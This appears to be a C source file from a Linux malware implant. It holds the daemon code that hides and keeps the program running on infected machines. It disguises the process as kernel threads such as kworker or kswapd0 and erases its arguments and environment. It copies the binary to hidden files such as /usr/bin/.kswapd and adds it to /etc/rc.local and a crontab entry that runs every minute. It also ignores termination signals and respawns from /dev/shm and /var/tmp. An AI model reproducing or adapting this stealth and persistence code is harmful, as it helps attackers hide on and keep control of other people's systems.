#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sched.h>
#include <sys/wait.h>
#include <dirent.h>
#include <time.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <signal.h>

#include "daemon.h"
#include "config.h"

#define MAX_INSTANCES 3
#define LOCK_FILE "/tmp/.systemd_lock"

extern char **environ;

void set_name(const char *name) {
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
}

void gen_name(char *out, int len) {
    const char *sys_names[] = {
        "kworker/0:0", "kworker/1:1", "migration/0", "ksoftirqd/0",
        "kworker/u256:0", "kthreadd", "kswapd0", "kblockd",
        "ata_sff", "md", "kworker/0:1", "kworker/1:0",
        "scsi_eh_0", "scsi_tmf_0", "kworker/u256:1", "kworker/0:2"
    };
    int num_names = sizeof(sys_names) / sizeof(sys_names[0]);

    static int seeded = 0;
    if (!seeded) {
        srand(time(NULL) ^ getpid());
        seeded = 1;
    }
    
    int idx = rand() % num_names;
    strncpy(out, sys_names[idx], len - 1);
    out[len - 1] = '\0';
}

static void exec_cmd(const char *cmd) {
    int ret = system(cmd);
    (void)ret;
}

void hide_process_name(int argc, char **argv) {
    for (char **env = environ; *env != NULL; ++env) {
        memset(*env, 0, strlen(*env));
    }

    size_t total = 0;
    for (int i = 0; i < argc; i++) {
        total += strlen(argv[i]) + 1;
    }

    memset(argv[0], 0, total);

    char fake_name[32];
    gen_name(fake_name, sizeof(fake_name));

    strncpy(argv[0], fake_name, total - 1);
    set_name(fake_name);
}

static int acquire_instance_lock(void) {
    int fd = open(LOCK_FILE, O_RDWR|O_CREAT, 0600);
    if(fd < 0) return 0;
    
    struct flock fl = {
        .l_type = F_WRLCK,
        .l_whence = SEEK_SET,
        .l_start = 0,
        .l_len = 1
    };
    
    if(fcntl(fd, F_SETLK, &fl) < 0) {
        close(fd);
        return 0;
    }
    return 1;
}

void respawn_proc(void) {
    if(!acquire_instance_lock()) return;
    
    char path[256];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if(len < 0) return;
    path[len] = '\0';
    
    const char *dirs[] = {"/tmp/.X11-unix", "/var/tmp", "/dev/shm"};
    for(int i = 0; i < 3; i++) {
        char tmp_path[256];
        snprintf(tmp_path, sizeof(tmp_path), "%s/.systemd", dirs[i]);
        
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cp -f %s %s 2>/dev/null", path, tmp_path);
        exec_cmd(cmd);
        
        chmod(tmp_path, 0755);
        
        pid_t child = fork();
        if(child == 0) {
            setsid();
            char *argv_fake[] = {"kworker", NULL};
            for(char **env = environ; *env; ++env) memset(*env, 0, strlen(*env));
            execl(tmp_path, "kworker", NULL);
            _exit(0);
        }
        
        if(child > 0) {
            unlink(tmp_path);
            break;
        }
    }
}

int startup_persist(char *exec) {
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *ent;
        while ((ent = readdir(dir)) != NULL) {
            pid_t pid = atoi(ent->d_name);
            if (pid <= 1 || pid == getpid()) continue;
            
            char exe_path[256];
            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
            char realpath_buf[512];
            ssize_t len = readlink(exe_path, realpath_buf, sizeof(realpath_buf)-1);
            if (len > 0) {
                realpath_buf[len] = '\0';
                if (strcmp(realpath_buf, exec) == 0) {
                    kill(pid, SIGKILL);
                }
            }
        }
        closedir(dir);
    }

    // Try multiple persistence methods
    char buf[512];
    FILE *f;
    
    // Method 1: /etc/rc.local
    snprintf(buf, sizeof(buf), "cp %s /usr/bin/.kswapd 2>/dev/null", exec);
    exec_cmd(buf);
    
    f = fopen("/etc/rc.local", "r+");
    if(f) {
        int found = 0;
        char line[512];
        while(fgets(line, sizeof(line), f)) {
            if(strstr(line, ".kswapd")) { found = 1; break; }
        }
        if(!found) {
            fseek(f, 0, SEEK_END);
            fprintf(f, "/usr/bin/.kswapd &\n");
        }
        fclose(f);
        chmod("/etc/rc.local", 0755);
    }
    
    // Method 2: crontab
    f = fopen("/tmp/cronjob", "w");
    if(f) {
        fprintf(f, "* * * * * /usr/bin/.kswapd >/dev/null 2>&1\n");
        fclose(f);
        exec_cmd("crontab /tmp/cronjob 2>/dev/null");
        unlink("/tmp/cronjob");
    }
    
    return 0;
}

void daemonize(int argc, char **argv) {
    pid_t pid;

    printf("\033[1;33m[*] Daemonizing process...\033[0m\n");

    // First fork
    if((pid = fork()) < 0) {
        perror("First fork failed");
        exit(1);
    }
    if(pid > 0) exit(0);

    // Create new session
    if(setsid() < 0) {
        perror("setsid failed");
        exit(1);
    }

    // Second fork
    if((pid = fork()) < 0) {
        perror("Second fork failed");
        exit(1);
    }
    if(pid > 0) exit(0);

    // Set signal handlers
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);

    // Change directory and set umask
    if(chdir("/") < 0) {
        perror("chdir failed");
        exit(1);
    }
    umask(0);

    // Close all file descriptors
    for(int i = 0; i < 1024; i++) close(i);

    // Reopen stdin, stdout, stderr to /dev/null
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);

    // Hide process and set persistence
    if(argc > 0) {
        hide_process_name(argc, argv);
        startup_persist(argv[0]);
    }

    // Set process name
    char name[32];
    gen_name(name, sizeof(name));
    set_name(name);

    printf("\033[1;32m[+] Daemon started successfully as %s\033[0m\n", name);
    
    // Respawn protection
    respawn_proc();
}
